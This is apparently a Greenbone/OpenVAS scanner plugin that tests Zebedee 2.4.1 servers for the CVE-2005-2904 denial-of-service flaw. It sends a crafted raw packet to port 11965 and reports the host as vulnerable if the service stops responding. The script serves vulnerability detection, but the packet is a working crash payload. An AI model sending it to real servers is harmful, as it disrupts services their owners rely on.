if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903028" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2005-2904" );
	script_bugtraq_id( 14796 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-05-24 11:08:06 +0530 (Thu, 24 May 2012)" );
	script_name( "Zebedee Allowed Redirection Port Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 11965 );
	script_xref( name: "URL", value: "http://secunia.com/advisories/16788/" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/22220" );
	script_xref( name: "URL", value: "http://www.juniper.net/security/auto/vulnerabilities/vuln14796.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause a denial of
  service via a zero in the port number of the protocol option header." );
	script_tag( name: "affected", value: "Zebedee version 2.4.1" );
	script_tag( name: "insight", value: "The flaw is due to an error, while handling a connection request that
  contains a port number value '0'." );
	script_tag( name: "solution", value: "Upgrade to Zebedee 2.4.1A or later." );
	script_tag( name: "summary", value: "The host is running Zebedee server and is prone to denial
  of service vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.winton.org.uk/zebedee/download.html" );
	exit( 0 );
}
port = 11965;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
crap = raw_string( 0x02, 0x01, 0x00, 0x00, 0x20, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x80, 0xff, 0xff, 0xff, 0xff, 0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74, 0x00, 0x00, 0x00, 0x00 );
send( socket: soc, data: crap );
sleep( 1 );
close( soc );
soc1 = open_sock_tcp( port );
if(!soc1){
	security_message( port );
	exit( 0 );
}
close( soc1 );

